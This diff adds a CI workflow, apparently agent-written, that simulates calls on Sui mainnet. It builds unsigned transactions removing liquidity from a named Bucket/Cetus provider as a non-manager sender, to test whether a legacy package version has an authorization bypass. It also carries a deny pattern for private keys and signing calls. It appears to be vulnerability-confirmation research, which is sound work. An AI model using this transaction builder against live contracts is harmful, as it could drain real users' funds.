@@ -1,0 +1,322 @@
+name: Bucket Cetus Legacy Manager-Auth DevInspect R6
+
+on:
+  pull_request:
+    branches: [main]
+  push:
+    branches: [agent/bucket-pyth-revival-gate-20260809]
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  devinspect:
+    runs-on: ubuntu-latest
+    timeout-minutes: 35
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install official Mysten TypeScript SDK
+        shell: bash
+        run: |
+          set -euo pipefail
+          rm -rf bucket-cetus-legacy-auth-r6
+          mkdir -p bucket-cetus-legacy-auth-r6/raw
+          cd bucket-cetus-legacy-auth-r6
+          npm init -y >/dev/null
+          npm pkg set type=module >/dev/null
+          npm install --no-audit --no-fund @mysten/sui@latest
+          npm list @mysten/sui | tee SDK_VERSION.txt
+
+      - name: Run latest-vs-legacy sender authorization control pairs
+        shell: bash
+        run: |
+          set -euo pipefail
+          cat > bucket-cetus-legacy-auth-r6/probe.mjs <<'JS'
+          import fs from 'node:fs';
+          import { Transaction, Inputs } from '@mysten/sui/transactions';
+
+          const RPCS = [
+            'https://sui-mainnet-endpoint.blockvision.org',
+            'https://fullnode.mainnet.sui.io:443',
+          ];
+
+          const ORIGIN = '0xb9204c991f982e4ec53dd9161ed56ff837716c81861929853e894d77eec71bea';
+          const LATEST = '0x2aa4b78126f4f838e330fa29efab2d2720185f7036cbbc4b5b0ab9815d80a302';
+          const MANAGER = '0xbb7e63ea8820707968c5c9879c5e3a8ac6ffe59337c7e307490089b8c6caf6ef';
+          const NON_MANAGER = '0x1111111111111111111111111111111111111111111111111111111111111111';
+
+          const IDS = {
+            provider: '0x891532c633c2f86dbdd595cc006112866f1122cfe9e915f58a8ba37440a2541c',
+            cetusConfig: '0xdaa46292632c3c4d8f31f23ea0f9b36a28ff3677e9684980e4438403a67a3d8f',
+            cetusPool: '0x6dc4048ae8eb73f24b6bc2381c0e6de9e7b06b01d96cee1eac2decd2400ffa46',
+            clock: '0x0000000000000000000000000000000000000000000000000000000000000006',
+            pythState: '0x1f9310238ee9298fb703c3419030b35b22bb1cc37113e3bb5007c99aec79e5b8',
+            priceInfo: '0x5dec622733a204ca27f5a90d8c2fad453cc6665186fd5dff13a83d0b6c9027ab',
+            pythConfig: '0x00aea60b799575ae4203bcc80c16844c4d514d5af661200c4565f6d5a6deac1f',
+            aggregator: '0x4b612d4d2039d90f596a362f15346a95149728613ca9d2e2c7e471b72b86c105',
+            treasury: '0x4de1c29a89d6888ebf8f7ae20364571dce4e1e42b9c9221f7df924ad6f9e617d',
+            psmPool: '0x37721762186721fb6eaf053f249aaf594503a6ad98dbcc998916be78d20a2df4',
+          };
+
+          const PKG = {
+            collector: '0xf2ab9aa60c5e879675351a1a89f47131de9dea7cc927327dd0e7282e295c7f5e',
+            pythRule: '0x5bc4f912b59c5cfcc86dfc90419837b9c3f9d3a3a94cef7a198838fa196bac4a',
+          };
+          const USDC = '0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC';
+
+          async function rpc(method, params) {
+            const failures = [];
+            for (const url of RPCS) {
+              try {
+                const response = await fetch(url, {
+                  method: 'POST',
+                  headers: { 'content-type': 'application/json' },
+                  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }),
+                });
+                const body = await response.json();
+                if (body.error) throw new Error(JSON.stringify(body.error));
+                return { endpoint: url, result: body.result };
+              } catch (error) {
+                failures.push({ endpoint: url, error: String(error) });
+              }
+            }
+            throw new Error(`RPC ${method} failed: ${JSON.stringify(failures)}`);
+          }
+
+          async function sharedRef(id, mutable) {
+            const { result } = await rpc('sui_getObject', [id, {
+              showType: true,
+              showOwner: true,
+              showPreviousTransaction: true,
+              showContent: true,
+              showBcs: true,
+            }]);
+            const data = result?.data;
+            const shared = data?.owner?.Shared;
+            if (!shared) throw new Error(`Object ${id} is not shared: ${JSON.stringify(data?.owner)}`);
+            return {
+              objectId: id,
+              initialSharedVersion: String(shared.initial_shared_version ?? shared.initialSharedVersion),
+              mutable,
+              type: data.type,
+              version: data.version,
+              digest: data.digest,
+            };
+          }
+
+          function sharedArg(tx, ref) {
+            const input = {
+              objectId: ref.objectId,
+              initialSharedVersion: ref.initialSharedVersion,
+              mutable: ref.mutable,
+            };
+            if (Inputs?.SharedObjectRef) return tx.object(Inputs.SharedObjectRef(input));
+            if (tx.object?.sharedObjectRef) return tx.object.sharedObjectRef(input);
+            if (typeof tx.sharedObjectRef === 'function') return tx.sharedObjectRef(input);
+            throw new Error('No supported shared-object-ref builder found');
+          }
+
+          function statusOf(body) {
+            const result = body?.result ?? body;
+            const status = result?.effects?.status;
+            if (typeof status === 'string') return status;
+            if (status?.status) return status.status;
+            if (status?.Success || status?.success) return 'success';
+            if (status?.Failure || status?.failure) return 'failure';
+            return null;
+          }
+
+          function errorOf(body) {
+            const result = body?.result ?? body;
+            return result?.error ?? result?.effects?.status?.error ?? result?.effects?.status?.Failure ?? body?.error ?? null;
+          }
+
+          const mutability = {
+            provider: true,
+            cetusConfig: false,
+            cetusPool: true,
+            clock: false,
+            pythState: false,
+            priceInfo: true,
+            pythConfig: false,
+            aggregator: false,
+            treasury: true,
+            psmPool: true,
+          };
+
+          const refs = {};
+          for (const [name, id] of Object.entries(IDS)) {
+            refs[name] = await sharedRef(id, mutability[name]);
+          }
+          fs.writeFileSync('raw/object_refs.json', JSON.stringify(refs, null, 2));
+
+          async function buildKind(packageId, sender, amount) {
+            const tx = new Transaction();
+            tx.setSender(sender);
+
+            const collector = tx.moveCall({
+              target: `${PKG.collector}::collector::new`,
+              typeArguments: [USDC],
+            });
+            tx.moveCall({
+              target: `${PKG.pythRule}::pyth_rule::feed`,
+              typeArguments: [USDC],
+              arguments: [
+                collector,
+                sharedArg(tx, refs.pythConfig),
+                sharedArg(tx, refs.clock),
+                sharedArg(tx, refs.pythState),
+                sharedArg(tx, refs.priceInfo),
+              ],
+            });
+            const priceResult = tx.moveCall({
+              target: `${PKG.collector}::aggregator::aggregate`,
+              typeArguments: [USDC],
+              arguments: [sharedArg(tx, refs.aggregator), collector],
+            });
+            tx.moveCall({
+              target: `${packageId}::cetus_lp_provider::remove_usdb_a_liquidity`,
+              typeArguments: [USDC],
+              arguments: [
+                sharedArg(tx, refs.provider),
+                sharedArg(tx, refs.cetusConfig),
+                sharedArg(tx, refs.cetusPool),
+                sharedArg(tx, refs.clock),
+                tx.pure.u64(1),
+                sharedArg(tx, refs.treasury),
+                sharedArg(tx, refs.psmPool),
+                priceResult,
+                tx.pure.u64(amount),
+              ],
+            });
+            const bytes = await tx.build({ onlyTransactionKind: true });
+            return { bytes, json: await tx.toJSON() };
+          }
+
+          async function devInspect(packageId, sender, amount, label) {
+            const built = await buildKind(packageId, sender, amount);
+            const txBase64 = Buffer.from(built.bytes).toString('base64');
+            fs.writeFileSync(`raw/${label}.txkind.b64`, `${txBase64}\n`);
+            fs.writeFileSync(`raw/${label}.tx.json`, built.json);
+
+            const paramsVariants = [
+              [sender, txBase64, null, null, { skip_checks: false }],
+              [sender, txBase64, null, null],
+              [sender, txBase64],
+            ];
+            const attempts = [];
+            for (const params of paramsVariants) {
+              for (const url of RPCS) {
+                try {
+                  const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'content-type': 'application/json' },
+                    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'sui_devInspectTransactionBlock', params }),
+                  });
+                  const body = await response.json();
+                  attempts.push({ endpoint: url, paramCount: params.length, body });
+                  if (!body.error) {
+                    fs.writeFileSync(`raw/${label}.devinspect.json`, JSON.stringify(body, null, 2));
+                    return {
+                      label,
+                      packageId,
+                      sender,
+                      amount: String(amount),
+                      endpoint: url,
+                      paramCount: params.length,
+                      status: statusOf(body),
+                      error: errorOf(body),
+                      body,
+                    };
+                  }
+                } catch (error) {
+                  attempts.push({ endpoint: url, paramCount: params.length, transportError: String(error) });
+                }
+              }
+            }
+            fs.writeFileSync(`raw/${label}.attempts.json`, JSON.stringify(attempts, null, 2));
+            return { label, packageId, sender, amount: String(amount), status: null, error: 'all devInspect attempts failed', attempts };
+          }
+
+          const cases = [];
+          for (const amount of [50n, 1000000n]) {
+            cases.push(await devInspect(LATEST, MANAGER, amount, `latest_manager_${amount}`));
+            cases.push(await devInspect(LATEST, NON_MANAGER, amount, `latest_non_manager_${amount}`));
+            cases.push(await devInspect(ORIGIN, MANAGER, amount, `legacy_manager_${amount}`));
+            cases.push(await devInspect(ORIGIN, NON_MANAGER, amount, `legacy_non_manager_${amount}`));
+          }
+
+          const compact = cases.map((row) => ({
+            label: row.label,
+            packageId: row.packageId,
+            sender: row.sender,
+            amount: row.amount,
+            endpoint: row.endpoint,
+            paramCount: row.paramCount,
+            status: row.status,
+            error: row.error,
+          }));
+          const byLabel = Object.fromEntries(compact.map((row) => [row.label, row]));
+          const amount = '1000000';
+          const control = {
+            latestManagerSuccess: byLabel[`latest_manager_${amount}`]?.status === 'success',
+            latestNonManagerRejected: byLabel[`latest_non_manager_${amount}`]?.status !== 'success',
+            legacyManagerSuccess: byLabel[`legacy_manager_${amount}`]?.status === 'success',
+            legacyNonManagerSuccess: byLabel[`legacy_non_manager_${amount}`]?.status === 'success',
+          };
+          const verdict = control.latestManagerSuccess
+            && control.latestNonManagerRejected
+            && control.legacyManagerSuccess
+            && control.legacyNonManagerSuccess
+            ? 'LEGACY_MANAGER_AUTH_BYPASS_CONFIRMED'
+            : 'NOT_CONFIRMED';
+
+          const summary = {
+            schema: 'bucket-cetus-legacy-manager-auth-devinspect-r6/v1',
+            network: 'sui-mainnet',
+            readOnly: true,
+            originPackage: ORIGIN,
+            latestPackage: LATEST,
+            manager: MANAGER,
+            nonManager: NON_MANAGER,
+            cases: compact,
+            control,
+            verdict,
+            productionTransactionsSubmitted: 0,
+            generatedUnix: Math.floor(Date.now() / 1000),
+          };
+          fs.writeFileSync('SUMMARY.json', JSON.stringify(summary, null, 2));
+          console.log(JSON.stringify(summary, null, 2));
+          JS
+          cd bucket-cetus-legacy-auth-r6
+          node probe.mjs | tee run.log
+          find . -type f ! -path './node_modules/*' -print0 | sort -z | xargs -0 sha256sum > SHA256SUMS.txt
+
+      - name: Validate read-only boundary
+        shell: bash
+        run: |
+          set -euo pipefail
+          grep -RniE 'executeTransaction|signAndExecute|private.?key|mnemonic' bucket-cetus-legacy-auth-r6/probe.mjs bucket-cetus-legacy-auth-r6/SUMMARY.json && exit 1 || true
+          python3 - <<'PY'
+          import json
+          summary = json.load(open('bucket-cetus-legacy-auth-r6/SUMMARY.json'))
+          assert summary['readOnly'] is True
+          assert summary['productionTransactionsSubmitted'] == 0
+          print('BUCKET_CETUS_LEGACY_AUTH_R6_READ_ONLY_PASS')
+          PY
+
+      - name: Upload evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: bucket-cetus-legacy-auth-r6
+          path: |
+            bucket-cetus-legacy-auth-r6/SUMMARY.json
+            bucket-cetus-legacy-auth-r6/SDK_VERSION.txt
+            bucket-cetus-legacy-auth-r6/probe.mjs
+            bucket-cetus-legacy-auth-r6/run.log
+            bucket-cetus-legacy-auth-r6/SHA256SUMS.txt
+            bucket-cetus-legacy-auth-r6/raw
+          if-no-files-found: error
+          retention-days: 7
